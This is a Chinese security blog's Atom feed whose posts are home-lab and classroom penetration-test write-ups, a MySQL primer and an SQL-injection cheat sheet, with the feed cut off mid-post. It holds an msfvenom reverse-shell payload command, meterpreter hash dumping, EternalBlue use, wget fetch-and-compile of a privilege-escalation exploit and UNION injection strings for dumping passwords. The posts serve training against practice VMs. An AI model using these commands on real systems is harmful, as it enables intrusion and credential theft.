<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pgg学长</title>
  
  <subtitle>花满楼</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://pgg666.org/"/>
  <updated>2019-06-01T14:31:14.144Z</updated>
  <id>https://pgg666.org/</id>
  
  <author>
    <name>pgg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC系列  对WORDY的一次入侵检测</title>
    <link href="https://pgg666.org/2019/06/01/%E5%AF%B9wordy%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"/>
    <id>https://pgg666.org/2019/06/01/对wordy的入侵检测/</id>
    <published>2019-05-31T16:00:00.000Z</published>
    <updated>2019-06-01T14:31:14.144Z</updated>
    
    <content type="html"><![CDATA[<h1 id="今天六一-祝各位小哥哥姐姐们开心"><a href="#今天六一-祝各位小哥哥姐姐们开心" class="headerlink" title="####今天六一##祝各位小哥哥姐姐们开心"></a>####今天六一##祝各位小哥哥姐姐们开心</h1><h2 id="DC系列-dc-6"><a href="#DC系列-dc-6" class="headerlink" title="#DC系列   dc-6"></a>#DC系列   dc-6</h2><p><strong>dc-6：   <a href="http://www.five86.com/dc-6.html" target="_blank" rel="noopener">http://www.five86.com/dc-6.html</a></strong></p><p><strong>ip:   192.168.0.168</strong></p><h4 id="1-首先先扫描它的端口-nmap-–sV-–p-A-192-168-0-168"><a href="#1-首先先扫描它的端口-nmap-–sV-–p-A-192-168-0-168" class="headerlink" title="1.  首先先扫描它的端口    nmap –sV –p- -A 192.168.0.168"></a>1.  首先先扫描它的端口    nmap –sV –p- -A 192.168.0.168</h4><p>111111111</p><h4 id="2-有-80端口-我们扫一下目录"><a href="#2-有-80端口-我们扫一下目录" class="headerlink" title="2.  有 80端口  我们扫一下目录"></a>2.  有 80端口  我们扫一下目录</h4><p>2222222</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;今天六一-祝各位小哥哥姐姐们开心&quot;&gt;&lt;a href=&quot;#今天六一-祝各位小哥哥姐姐们开心&quot; class=&quot;headerlink&quot; title=&quot;####今天六一##祝各位小哥哥姐姐们开心&quot;&gt;&lt;/a&gt;####今天六一##祝各位小哥哥姐姐们开心&lt;/h1&gt;&lt;h2 id=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一次系统的内网渗透测试</title>
    <link href="https://pgg666.org/2019/05/31/%E4%B8%80%E6%AC%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B8%97%E9%80%8F/"/>
    <id>https://pgg666.org/2019/05/31/一次系统的渗透/</id>
    <published>2019-05-30T16:00:00.000Z</published>
    <updated>2019-05-31T09:10:58.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次系统的渗透测试"><a href="#一次系统的渗透测试" class="headerlink" title="#一次系统的渗透测试"></a>#一次系统的渗透测试</h1><p>​            <del>所需工具</del>    ：     <strong>虚拟机开：一台kail,一台windows sever 2008 ,一台win7</strong></p><p><em>大致过程</em> ：<strong>首先用2008开一个web服务器，我们本地浏览，并上传木马，然后用木马反弹到kail上，提权并扫描其局域网，利用2008做跳板，入侵win 7</strong></p><p><em>细节</em>  :   <strong>kail要用桥接模式；2008需要2个网络适配器，一个桥接，一个NAT；win7 NAT就行了</strong></p><p><em>说明</em>  ：<strong>因为在没有服务器的情况下自己搭建渗透环境，所以需要kail和2018桥接，让主机和kail,2008互相可以访问。</strong></p><ol><li><p><strong>搭建2008服务器</strong></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/1.png"></p></li></ol><p>   搭建好了之后，我们去浏览器访问一下</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/2.png"></p><p>   服务器已经搭建成功了，我们上传一个1.txt  看看能不能访问到</p><p>   <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/3.png"></p><p>   <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/4.png"></p><p>   本来是要搭建一个上传页面，但是我们做本地测试就不那么麻烦了，直接上传本地上传一个asp的木马上去</p><ol start="2"><li><p><strong>利用菜刀连接asp的一句话木马</strong></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/5.png"></p><p>使用 命令：WhoamI   查看一下我们是什么权限</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/6.png"></p><p>权限好低呀，  本来可以用cve提的，我们现在就用kail提吧</p></li><li><p><strong>利用菜刀上传kail用msf生成的反弹木马上线到2008上</strong></p><p>命令：msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f exe -o liu.exe</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/7.png"></p><p>直接用命令：python -m SimpleHTTPServer 8000</p><p>开一个ftp,用本机下载，然后通过菜刀上传到2008上面</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/8.png"></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/9.png"></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/10.png"></p><p>发现上传不到c盘，应该是因为我们权限不够，我们试试上传到其他文件夹</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/11.png"></p><p>好了，上传上去了，我们用kail的msf监听，然后再运行这个程序</p><p>首先进入监听模块 命令： use exploit/multi/handler </p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/12.png"></p><p>然后添加我们生成exe的payload   命令： set payload windows/x64/meterpreter/reverse_tcp</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/13.png"></p><p>运行</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/14.png"></p><p>虽然运行失败了，但是kail上线了，可能是玄学问题</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/15.png"></p><p>现在我们进入到meterpreter 里提权</p><p>首先查看一下自身权限</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/16.png"></p><p>发现还是一样，权限并没有什么变化</p></li><li><p><strong>提权</strong></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/17.png"></p><p>普通的令牌窃取提权不行了  现在使用msf提权试试</p><p>命令：use post/multi/recon/local_exploit_suggester    </p></li></ol><p>​        漏洞搜索对比</p><p>​      <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/18.png"></p><p>​    要等好久，，</p><p>​    <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/19.png"></p><p>​    既然跑出来，那我们就用这些exp跑下试试，看能不能成功提权</p><p>​    <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/20.png"></p><p>​    发现这些exp都不能打，我们再试试其他的</p><p>​    use exploit/windows/local/ms15_051_client_copy_image</p><p>​    <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/21.png"></p><p>​    <img src="http://kan.027cgb.com/613977/一次系统的渗透测试/22.png"></p><p>​    已经打到了会话，查看了权限，是 AUTHORITY\SYSTEM 的权限</p><ol start="5"><li><p>既然拿到了管理员权限，那我们就不能不查看下他的管理员密码了</p><p>先用msf里meterprter 里的查看密码模块来查看 命令：meterpreter &gt; run post/windows/gather/smart_hashdump </p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/23.png"></p><p>命令：meterpreter &gt; run post/windows/gather/hashdump</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/24.png"></p><p>命令：hashdump</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/25.png"></p><p>接下来我们就要返回到msf里面查看用户密码 命令：use post/windows/gather/hashdump</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/26.png"></p><p>我们的目标是内网里的那台win7 所以就不远程上去了</p></li></ol><ol start="6"><li><p>内网渗透</p><p>先查看跳板机处于哪几个网段中，使用 get_local_subnets 脚本    run get_local_subnets</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/27.png"></p><p>直接将内网网段192.168.127.0/24添加至路由表，使用 autoroute 脚本  run autoroute -s 192.168.127.0/24</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/28.png"></p><p>添加网路由后，我们来查看下路由的添加情况如何，具体命令如下所示：meterpreter &gt; run autoroute -p</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/29.png"></p><p>现在我们来扫一下内网，看我们能不能扫出win7 的内网ip</p><p><strong>扫描网段存活主机：</strong> <strong>use post/multi/gather/ping_sweep</strong>     </p><p> <strong>use post/windows/gather/arp_scanner</strong></p><p><strong>use</strong> auxiliary/scanner/smb/smb_ms17_010</p><p><strong>use auxiliary/scanner/smb/smb_version </strong>      等等好多</p><p>这里我们就用最后一个</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/30.png"></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/31.png"></p><p>既然扫出来了，那我们就打一下它 用最近最火的永恒之蓝试试</p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/32.png"></p><p><img src="http://kan.027cgb.com/613977/一次系统的渗透测试/33.png"></p></li></ol><p><strong>##</strong>   <em>本次内网渗透就这样结束了，爱你们</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一次系统的渗透测试&quot;&gt;&lt;a href=&quot;#一次系统的渗透测试&quot; class=&quot;headerlink&quot; title=&quot;#一次系统的渗透测试&quot;&gt;&lt;/a&gt;#一次系统的渗透测试&lt;/h1&gt;&lt;p&gt;​            &lt;del&gt;所需工具&lt;/del&gt;    ：     &lt;s
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql数据库</title>
    <link href="https://pgg666.org/2019/05/31/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://pgg666.org/2019/05/31/mysql数据库/</id>
    <published>2019-05-30T16:00:00.000Z</published>
    <updated>2019-05-31T09:23:28.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h1><h4 id="数据库简介："><a href="#数据库简介：" class="headerlink" title="数据库简介："></a>数据库简介：</h4><h5 id="1-什么是数据库：数据库就是将大量数据保存起来，通过计算机加工而成的可以高效访问的数据集合"><a href="#1-什么是数据库：数据库就是将大量数据保存起来，通过计算机加工而成的可以高效访问的数据集合" class="headerlink" title="1. 什么是数据库：数据库就是将大量数据保存起来，通过计算机加工而成的可以高效访问的数据集合"></a>1. 什么是数据库：数据库就是将大量数据保存起来，通过计算机加工而成的可以高效访问的数据集合</h5><h5 id="数据库是长期储存在计算机内，有组织的，可共享的数据集合。"><a href="#数据库是长期储存在计算机内，有组织的，可共享的数据集合。" class="headerlink" title="数据库是长期储存在计算机内，有组织的，可共享的数据集合。"></a>数据库是长期储存在计算机内，有组织的，可共享的数据集合。</h5><h5 id="2-常见的数据库："><a href="#2-常见的数据库：" class="headerlink" title="2.常见的数据库："></a>2.常见的数据库：</h5><h5 id="①Oracle-Database-甲骨文公司-②SQL-Server-微软公司"><a href="#①Oracle-Database-甲骨文公司-②SQL-Server-微软公司" class="headerlink" title="①Oracle Database:甲骨文公司   ②SQL Server: 微软公司"></a>①Oracle Database:甲骨文公司   ②SQL Server: 微软公司</h5><h5 id="③DB2-IBM公司-④-PostgreSQL-开源⑤MySQL-开源"><a href="#③DB2-IBM公司-④-PostgreSQL-开源⑤MySQL-开源" class="headerlink" title="③DB2: IBM公司    ④ PostgreSQL: 开源⑤MySQL:开源"></a>③DB2: IBM公司    ④ PostgreSQL: 开源⑤MySQL:开源</h5><h3 id="数据库结构："><a href="#数据库结构：" class="headerlink" title="数据库结构："></a>数据库结构：</h3><p>​                 1.服务器：用于接收并处理其他程序发出的请求的程序（软件），或者是安装此类程序的设备（计算机）</p><p>​        2. 客户端：向服务器发出请求的程序（软件），或者是安装此类程序的设备（计算机）。</p><p>​        3. 表（table）:类似Excel, 由行和列组成的二维表。</p><p>​        4. 字段：表的列（垂直方向）。</p><p>​        5. 记录： 表的行（水平方向）。 【关系数据库必须以行为单位进行数据读写】</p><p>​        6.单位格： 行列交汇处。【注意】与Excel不同，一个单位格只能输入一个数据。</p><h3 id="sql语句种类："><a href="#sql语句种类：" class="headerlink" title="sql语句种类："></a>sql语句种类：</h3><p>​        <em>sql语句：</em>  <strong>用关键字，表名和列名等组成而成的一句语句。</strong></p><p><strong>三种sql语句种类：</strong> </p><p>​        （1）DDL(数据库语言)：创建，删除或修改数据库以及数据库中的表等对象</p><p>​            1. create:创建数据库和表等对象</p><p>​            2. drop: 删除数据库和表等对象</p><p>​            3. alter: 修改数据库和表等对象</p><p>​        （2）DML(数据库操作语言)：查询或修改表中的记录。</p><p>​            1.select:查询表中的数据</p><p>​            2.insert:向表中插入数据</p><p>​            3. update: 修改表中的数据</p><p>​            4. delete: 删除表中的数据  </p><p>​        （3）DCL(数据控制语言)：确认或取消对数据库中的数据变更的执行操作，以及对用户</p><p>​            操作数据库中的对象权限进行设定   </p><h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><p>​        group_concat()  返回由属于一组的列值连接组合而成的结果</p><p>​        ascll()    返回字符的ascll码值</p><p>​        database()   返回当前数据库名</p><p>​        user()或system_user()   返回当前登录用户名</p><p>​        version()   返回mysql服务器的版本</p><p>​        sleep()    休眠秒数</p><h3 id="基本sql语法："><a href="#基本sql语法：" class="headerlink" title="基本sql语法："></a>基本sql语法：</h3><h5 id="创建数据库："><a href="#创建数据库：" class="headerlink" title="创建数据库："></a>创建数据库：</h5><p>​    create database zkaq charset=utf8;</p><h5 id="创建表："><a href="#创建表：" class="headerlink" title="创建表："></a>创建表：</h5><p>​    create table pgg(username varchar(255) not null PRIMARY KEY) charset=utf8</p><p>​    desc ***    查看表的详细内容</p><p>​    删除表：</p><p>​    drop table pgg;</p><h5 id="表里添加字段："><a href="#表里添加字段：" class="headerlink" title="表里添加字段："></a>表里添加字段：</h5><p>​    alter table pgg add password varchar(255);</p><h5 id="表里删除字段："><a href="#表里删除字段：" class="headerlink" title="表里删除字段："></a>表里删除字段：</h5><p>​    alter table pgg drop column password</p><p>​    </p><h5 id="往字段添加值："><a href="#往字段添加值：" class="headerlink" title="往字段添加值："></a>往字段添加值：</h5><p>​    insert into pgg values (‘admin’,’123456’);</p><h5 id="查询表内容："><a href="#查询表内容：" class="headerlink" title="查询表内容："></a>查询表内容：</h5><p>​    select *from flag;</p><h5 id="查询字段的内容："><a href="#查询字段的内容：" class="headerlink" title="查询字段的内容："></a>查询字段的内容：</h5><p>​    select username from flag;</p><h5 id="查询字段内容-带条件："><a href="#查询字段内容-带条件：" class="headerlink" title="查询字段内容 带条件："></a>查询字段内容 带条件：</h5><p>​    select *from flag where username=’admin’;</p><p>​    </p><p>​    select *from flag order by 1;</p><p>​    select *from flag limit 0,1;</p><h5 id="修改字段内容："><a href="#修改字段内容：" class="headerlink" title="修改字段内容："></a>修改字段内容：</h5><p>​    update flag set username = ‘root’ where username = ‘admin123456’;</p><h5 id="删除整条字段的内容："><a href="#删除整条字段的内容：" class="headerlink" title="删除整条字段的内容："></a>删除整条字段的内容：</h5><p>​    delete from pgg where username=’root’</p><h5 id="删除一个字段"><a href="#删除一个字段" class="headerlink" title="删除一个字段"></a>删除一个字段</h5><p>​    alter table pgg drop column username</p><h3 id="联合查询："><a href="#联合查询：" class="headerlink" title="联合查询："></a>联合查询：</h3><p>​    表的内容无重复：</p><p>​    select <em>from flag union select</em>from admin;</p><p>​    骚操作</p><p>​    select *from flag where username=’admin’ union select 1,2,3 from admin;</p><p>​    select *from flag where username=’admin’ union select 1,2,3 from admin limit 0,1;</p><h3 id="连接查询："><a href="#连接查询：" class="headerlink" title="连接查询："></a>连接查询：</h3><p>例子：</p><h5 id="a表-id-name-b表-id-job-parent-id"><a href="#a表-id-name-b表-id-job-parent-id" class="headerlink" title="a表   id  name       b表    id    job     parent_id"></a>a表   id  name       b表    id    job     parent_id</h5><h5 id="1-张三-1-23-1"><a href="#1-张三-1-23-1" class="headerlink" title="1  张三                   1    23           1"></a>1  张三                   1    23           1</h5><h5 id="2-李四-2-34-2"><a href="#2-李四-2-34-2" class="headerlink" title="2  李四                   2    34           2"></a>2  李四                   2    34           2</h5><h5 id="3-王五-3-34-4"><a href="#3-王五-3-34-4" class="headerlink" title="3   王五                  3     34           4"></a>3   王五                  3     34           4</h5><h5 id="1）内连接："><a href="#1）内连接：" class="headerlink" title="1）内连接："></a>1）内连接：</h5><p>select a.<em>,b.</em> from a inner join b on a.ids=b.parent_id结果是</p><p>1   张三                1   23    1</p><p>2   李四                2  34      2</p><h5 id="2）左连接："><a href="#2）左连接：" class="headerlink" title="2）左连接："></a>2）左连接：</h5><p>select a.<em>,b.</em> from a left join b on a.id=b.parent_id结果是</p><p>1  张三      1   23   1</p><p>2   李四    2   34    2</p><p>3   王五    null   null  null</p><h5 id="3-右连接："><a href="#3-右连接：" class="headerlink" title="3) 右连接："></a>3) 右连接：</h5><p>select a.<em>,b.</em> from a right join b on a.id=b.parent_id结果是</p><p>1   张三        1        23    1</p><p>2   李四        2        34    2</p><p>​    null   null      3        34    4</p><h3 id="子查询："><a href="#子查询：" class="headerlink" title="子查询："></a>子查询：</h3><h5 id="关键字："><a href="#关键字：" class="headerlink" title="关键字："></a>关键字：</h5><p>any 对于子查询返回的列中的任何一个数值，如果比较结果为true，就返回true</p><p>in  效果等同于any</p><p>all 效果与any相反，比较结果必须全部为false  </p><p>some some是any的别名，用的比较少</p><p>exlsts  子查询是否有结果，若返回0行则表示false,否则为true</p><h5 id="标量子查询（返回一个结果）："><a href="#标量子查询（返回一个结果）：" class="headerlink" title="标量子查询（返回一个结果）："></a>标量子查询（返回一个结果）：</h5><p>select*from 表1 where 表1.id=(select id from 表2 where 条件 limit 0,1 )</p><p>列子查询（指子查询返回的结果集是N行一列）：</p><p>select *from 表1 where 表1.id in (select id from 表2 where 条件)</p><p>行子查询（指子查询返回的结果集是一行 N列）：</p><p>select *from 表1 where (列1，列2)=（select 列1，列2 from 表2 where 条件 limit 0,1）</p><p>表子查询（指子查询返回的结果集是N行N列的一个表数据）：</p><p>select*from 表1 where (列1，列2) in (select 列1，列2 from 表2 where 条件)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mysql数据库&quot;&gt;&lt;a href=&quot;#mysql数据库&quot; class=&quot;headerlink&quot; title=&quot;mysql数据库&quot;&gt;&lt;/a&gt;mysql数据库&lt;/h1&gt;&lt;h4 id=&quot;数据库简介：&quot;&gt;&lt;a href=&quot;#数据库简介：&quot; class=&quot;headerli
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql注入入门基本语法</title>
    <link href="https://pgg666.org/2019/05/31/sql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>https://pgg666.org/2019/05/31/sql注入入门基本语法/</id>
    <published>2019-05-30T16:00:00.000Z</published>
    <updated>2019-05-31T09:22:53.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入入门基本语法："><a href="#sql注入入门基本语法：" class="headerlink" title="sql注入入门基本语法："></a>sql注入入门基本语法：</h1><h4 id="今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。"><a href="#今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。" class="headerlink" title="今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。"></a>今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。</h4><h4 id="有没有听过一句话“一生二，二生三，三生万物”"><a href="#有没有听过一句话“一生二，二生三，三生万物”" class="headerlink" title="有没有听过一句话“一生二，二生三，三生万物”"></a>有没有听过一句话“一生二，二生三，三生万物”</h4><h4 id="sql注入里-今天我讲的就是这个一。"><a href="#sql注入里-今天我讲的就是这个一。" class="headerlink" title="sql注入里 今天我讲的就是这个一。"></a>sql注入里 今天我讲的就是这个一。</h4><p>############################################################</p><p>先判断注入类型   id=1’        id=1 and 1=1</p><p> 猜字段数    order by 1         猜有几个字段数</p><p>  爆当前的用户名  数据库名   mysql版本        union select database(),user(),version()</p><h4 id="这里我还是解释下吧-如果-order-by-10-那么就-查看他的显示位，-知道了显示位，想查数据库名就在显示位输入-database-select-union-1-2-3-database-5-6-7-8-9-10"><a href="#这里我还是解释下吧-如果-order-by-10-那么就-查看他的显示位，-知道了显示位，想查数据库名就在显示位输入-database-select-union-1-2-3-database-5-6-7-8-9-10" class="headerlink" title="这里我还是解释下吧   如果 order by  10     那么就 查看他的显示位， 知道了显示位，想查数据库名就在显示位输入 database()   select union 1,2,3,database(),5,6,7,8,9,10"></a>这里我还是解释下吧   如果 order by  10     那么就 查看他的显示位， 知道了显示位，想查数据库名就在显示位输入 database()   select union 1,2,3,database(),5,6,7,8,9,10</h4><p>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1%23      爆表        假设库为security</p><p>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1%23   爆字段</p><p>?id=-1’ union select id,username,password from users limit 0,1%23       爆字段内容</p><p>user====&gt;id,username,password</p><p>select name from user;</p><p>select table_name from information_schema.tables where table_schema=’security’;    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql注入入门基本语法：&quot;&gt;&lt;a href=&quot;#sql注入入门基本语法：&quot; class=&quot;headerlink&quot; title=&quot;sql注入入门基本语法：&quot;&gt;&lt;/a&gt;sql注入入门基本语法：&lt;/h1&gt;&lt;h4 id=&quot;今日，天下英雄齐聚在此，还有不少是我pgg昔日的好
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>对Typhoon的一次入侵</title>
    <link href="https://pgg666.org/2019/05/20/%E5%AF%B9Typhoon%E7%9A%84%E4%B8%80%E6%AC%A1%E5%85%A5%E4%BE%B5/"/>
    <id>https://pgg666.org/2019/05/20/对Typhoon的一次入侵/</id>
    <published>2019-05-19T16:00:00.000Z</published>
    <updated>2019-06-01T10:21:38.736Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对Typhoon的一次入侵"><a href="#对Typhoon的一次入侵" class="headerlink" title="对Typhoon的一次入侵"></a>对Typhoon的一次入侵</h1><p><em>老师开了搭建了一个网站让我们尝试入侵  Ip为：192.168.0.159 ，首先我先访问看看</em></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/1.png"></p><h4 id="1-首先看到这个网站，我习惯性的是先扫描一下它的目录-，再扫描一下它的端口"><a href="#1-首先看到这个网站，我习惯性的是先扫描一下它的目录-，再扫描一下它的端口" class="headerlink" title="1.  首先看到这个网站，我习惯性的是先扫描一下它的目录 ，再扫描一下它的端口"></a>1.  首先看到这个网站，我习惯性的是先扫描一下它的目录 ，再扫描一下它的端口</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image2.png"></p><p>nmap -sV -p- -A -Pn    </p><p>nmap -sS -sV -A –O</p><p>nmap –A  </p><p>21(ftp),</p><p>· 22(ssh),</p><p>· 25(smtp),</p><p>· 53(domain),</p><p>· 80(http),</p><p>· 110(pop3)</p><p>· 111(rpcbind)</p><p>· 139(netbios-ssn)</p><p>· 143(imap)</p><p>· 445(netbios-ssn)</p><p>· 631(ipp)</p><p>· 993(ssl/imaps),</p><p>· 995(ssl/pop3)</p><p>· 2049(nfs_acl)</p><p>· 3306(mysql),</p><p>· 5432(postgrespl)</p><p>· 8080(http)</p><p>如图：</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image3.png"></p><p>在图中，可以看到robots.txt文件中/monoadmin这个目录禁止访问，这个目录可能会有用。我们还注意到8080端口也开放了，对应的服务是Apache Tomcat，使用的引擎是Coyote JSP engine1.1。这可能是另外一种渗透靶机的方法，我们一会儿再来看看。</p><h4 id="2-发现有个robots-txt目录-我们去访问看看"><a href="#2-发现有个robots-txt目录-我们去访问看看" class="headerlink" title="2.  发现有个robots.txt目录 我们去访问看看"></a>2.  发现有个robots.txt目录 我们去访问看看</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image4.png"></p><h4 id="3-有个目录，我们去访问看看"><a href="#3-有个目录，我们去访问看看" class="headerlink" title="3.   有个目录，我们去访问看看"></a>3.   有个目录，我们去访问看看</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image5.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image6.png"></p><h4 id="4-这里我们设置-change-database为credentials-84mb-，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945"><a href="#4-这里我们设置-change-database为credentials-84mb-，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945" class="headerlink" title="4.这里我们设置 change database为credentials(84mb)，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945"></a>4.这里我们设置 change database为credentials(84mb)，它会显示2个凭证的链接，我们点击一下这个链接，竟然显示出了用户名和密码，用户名是typhoon，密码是78945</h4><h4 id="5-开放了22端口，那我们就用ssh试试"><a href="#5-开放了22端口，那我们就用ssh试试" class="headerlink" title="5. 开放了22端口，那我们就用ssh试试"></a>5. 开放了22端口，那我们就用ssh试试</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image7.png"></p><h4 id="6-登录上来了，我们现在发现它的操作系统是Ubuntu-14-04-我们现在用searchsploit-搜索一下Ubuntu的提权exp"><a href="#6-登录上来了，我们现在发现它的操作系统是Ubuntu-14-04-我们现在用searchsploit-搜索一下Ubuntu的提权exp" class="headerlink" title="6.  登录上来了，我们现在发现它的操作系统是Ubuntu 14.04   我们现在用searchsploit 搜索一下Ubuntu的提权exp"></a>6.  登录上来了，我们现在发现它的操作系统是Ubuntu 14.04   我们现在用searchsploit 搜索一下Ubuntu的提权exp</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image8.png"></p><h4 id="7-我们随便使用17292-c的exp去打它-先下载到本地kail上-命令：-searchsploit-–m-37292-，然后使用python启动一个服务器，然后靶机进-tmp目录下载-启动服务器命令-：python-–m-SimpleHTTPServer-8000-下载命令-：wget-http-192-168-0-159-37292-c"><a href="#7-我们随便使用17292-c的exp去打它-先下载到本地kail上-命令：-searchsploit-–m-37292-，然后使用python启动一个服务器，然后靶机进-tmp目录下载-启动服务器命令-：python-–m-SimpleHTTPServer-8000-下载命令-：wget-http-192-168-0-159-37292-c" class="headerlink" title="7.  我们随便使用17292.c的exp去打它   先下载到本地kail上  命令： searchsploit –m 37292 ，然后使用python启动一个服务器，然后靶机进 tmp目录下载    启动服务器命令 ：python –m SimpleHTTPServer 8000    下载命令 ：wget http://192.168.0.159/37292.c"></a>7.  我们随便使用17292.c的exp去打它   先下载到本地kail上  命令： searchsploit –m 37292 ，然后使用python启动一个服务器，然后靶机进 tmp目录下载    启动服务器命令 ：python –m SimpleHTTPServer 8000    下载命令 ：wget <a href="http://192.168.0.159/37292.c" target="_blank" rel="noopener">http://192.168.0.159/37292.c</a></h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image9.png"></p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image10.png"></p><h4 id="8-编译exp并赋予权限，然后执行，成功提到root"><a href="#8-编译exp并赋予权限，然后执行，成功提到root" class="headerlink" title="8.  编译exp并赋予权限，然后执行，成功提到root"></a>8.  编译exp并赋予权限，然后执行，成功提到root</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image11.png"></p><h5 id="发现这个网站并没有那么简单，我们来换几种方式来入侵试试"><a href="#发现这个网站并没有那么简单，我们来换几种方式来入侵试试" class="headerlink" title="发现这个网站并没有那么简单，我们来换几种方式来入侵试试"></a>发现这个网站并没有那么简单，我们来换几种方式来入侵试试</h5><h4 id="1-前面通过扫描知道了8080端口是开放的，而且开放了Apache-Tomcat服务，直接在浏览器中访问8080端口看看，如图"><a href="#1-前面通过扫描知道了8080端口是开放的，而且开放了Apache-Tomcat服务，直接在浏览器中访问8080端口看看，如图" class="headerlink" title="1.  前面通过扫描知道了8080端口是开放的，而且开放了Apache Tomcat服务，直接在浏览器中访问8080端口看看，如图"></a>1.  前面通过扫描知道了8080端口是开放的，而且开放了Apache Tomcat服务，直接在浏览器中访问8080端口看看，如图</h4><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image12.png"></p><h4 id="2-发现"><a href="#2-发现" class="headerlink" title="2. 发现"></a>2. 发现</h4><ol><li><h4 id="需要登录，于是想用msf测试存在账号密码"><a href="#需要登录，于是想用msf测试存在账号密码" class="headerlink" title="需要登录，于是想用msf测试存在账号密码"></a>需要登录，于是想用msf测试存在账号密码</h4></li></ol><p>命令：use auxiliary/scanner/http/tomcat_mgr_login</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image13.png"></p><h4 id="3-得到账号密码："><a href="#3-得到账号密码：" class="headerlink" title="3.  得到账号密码："></a>3.  得到账号密码：</h4><h4 id="username-tomcat-password-tomcat-利用mgr-upload漏洞"><a href="#username-tomcat-password-tomcat-利用mgr-upload漏洞" class="headerlink" title="username:tomcat   password:tomcat   利用mgr_upload漏洞"></a>username:tomcat   password:tomcat   利用mgr_upload漏洞</h4><p>命令： use exploit/multi/http/tomcat_mgr_upload</p><p><img src="http://kan.027cgb.com/613977/对Typhoon的一次入侵/image14.png"></p><h4 id="4-进来之后发现是一个python-shell"><a href="#4-进来之后发现是一个python-shell" class="headerlink" title="4. 进来之后发现是一个python 